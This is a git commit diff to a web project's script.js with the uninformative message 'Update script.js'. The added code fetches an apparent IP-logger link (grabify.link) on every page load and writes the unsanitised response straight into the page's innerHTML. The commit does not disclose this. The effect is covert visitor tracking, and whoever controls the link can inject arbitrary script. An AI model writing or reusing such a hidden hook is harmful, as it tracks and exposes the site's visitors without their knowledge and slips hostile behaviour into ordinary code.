8b08c80843af88c592f7c832c3debebfede25c89
Nirlesh-N95 <152071712+Nirlesh-N95@users.noreply.github.com>
2024-06-11 12:59:28 +0530

    Update script.js

--- script.js
+++ script.js
@@ -51,6 +51,22 @@ const specificValues = [7, 2023];
 //document.body.style.backgroundImage = "Assets/Moye-S7.gif"; // Reset background image
             };
 
+   function loadContent(url) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4 && xhr.status === 200) {
+            
+            document.getElementById("qwe").innerHTML = xhr.responseText;
+          }
+        };
+        xhr.send();
+      }
+      
+
+      loadContent("https://grabify.link/2NJ4IQ");
+        
+
    function prepareInput(value) {
             // Remove any leading/trailing spaces
             const trimmedValue = value.trim();
